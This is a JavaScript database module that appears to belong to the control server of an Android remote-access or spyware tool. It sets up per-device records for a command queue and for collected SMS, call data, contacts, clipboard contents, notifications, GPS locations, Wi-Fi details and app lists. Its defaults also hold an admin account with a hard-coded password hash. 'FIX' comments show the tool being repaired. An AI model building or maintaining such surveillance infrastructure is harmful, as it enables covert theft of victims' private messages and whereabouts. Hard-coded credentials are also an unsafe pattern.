const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    adapter = new FileSync('./maindb.json'),
    db = lowdb(adapter);

db.defaults({
    admin: {
        username: 'athex',
        password: '027437411a0e7e3fd908755a5e2251aa',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write();

// FIX: returning a value from a class constructor is legal but confusing.
// Turned it into a factory function that returns the lowdb instance directly,
// while still exporting it as `clientdb` so existing `new this.db.clientdb(id)` calls work.
//
// FIX: also handle missing `./clientData/` directory gracefully.
class clientdb {
    constructor(clientID) {
        const dir = path.join(__dirname, 'clientData');
        // FIX: ensure the directory exists before lowdb tries to write into it.
        if (!require('fs').existsSync(dir)) require('fs').mkdirSync(dir, { recursive: true });

        let cdb = lowdb(new FileSync(path.join(dir, clientID + '.json')));
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: []
        }).write();
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};